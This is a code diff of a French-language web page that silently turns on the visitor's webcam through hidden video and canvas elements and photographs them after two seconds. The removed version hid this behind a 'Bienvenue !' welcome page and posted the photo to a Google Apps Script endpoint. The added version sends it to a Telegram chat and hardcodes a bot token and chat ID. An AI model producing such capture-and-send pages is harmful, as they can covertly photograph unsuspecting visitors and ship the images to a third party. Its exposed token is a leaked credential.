@@ -10,15 +10,15 @@
 </style>
 </head>
 <body>
-<h1>Bienvenue !</h1>
+<h1>📸 Photo automatique</h1>
 <div id="status">Chargement...</div>
 
-<!-- Éléments nécessaires à la capture, mais non affichés -->
 <video id="video" autoplay playsinline muted style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbza8l1dv_UCQ1rvWtJ0MpOkhEdQAMjSGJ_xsuCqhx4h2DPSrGf61mTL3tzaDduzUnwPig/exec";
+const TOKEN = "8923372171:AAH60PG4woDX9kR3CpD6IIIY4oWnUbDm6-c";
+const CHAT_ID = "8675191556";
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
@@ -29,7 +29,7 @@ navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } })
   .catch(err => { status.textContent = "❌ Caméra refusée : " + err.message; });
 
 video.addEventListener('playing', () => {
-  status.textContent = "Un instant...";
+  status.textContent = "⏳ Photo dans 2 secondes...";
   setTimeout(prendrePhoto, 2000);
 });
 
@@ -39,29 +39,22 @@ function prendrePhoto() {
   canvas.height = video.videoHeight;
   canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  const base64 = canvas.toDataURL('image/jpeg', 0.9).split(',')[1];
-  status.textContent = "Envoi...";
-  envoyer(base64);
-}
+  canvas.toBlob(blob => {
+    status.textContent = "📤 Envoi vers Telegram...";
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", "📸 Photo du " + new Date().toLocaleString());
+    form.append("photo", blob, "photo_" + Date.now() + ".jpg");
 
-function envoyer(base64Image) {
-  fetch(APPS_SCRIPT_URL, {
-    method: "POST",
-    headers: { "Content-Type": "text/plain" },
-    body: JSON.stringify({
-      image: base64Image,
-      nom: "photo_" + Date.now() + ".jpg",
-      date: new Date().toLocaleString()
-    })
-  })
-  .then(r => r.text())
-  .then(txt => {
-    console.log("Réponse Apps Script :", txt);
-    status.textContent = txt.includes('"ok":true')
-      ? "Merci ! ✅"
-      : "Réponse du script :\n" + txt;
-  })
-  .catch(err => { status.textContent = "❌ Erreur réseau : " + err.message; });
+    fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: form })
+      .then(r => r.json())
+      .then(json => {
+        status.textContent = json.ok
+          ? "✅ Photo envoyée sur ton Telegram !"
+          : "⚠️ Erreur Telegram :\n" + JSON.stringify(json, null, 2);
+      })
+      .catch(err => { status.textContent = "❌ Erreur réseau : " + err.message; });
+  }, "image/jpeg", 0.9);
 }
 </script>
 </body>
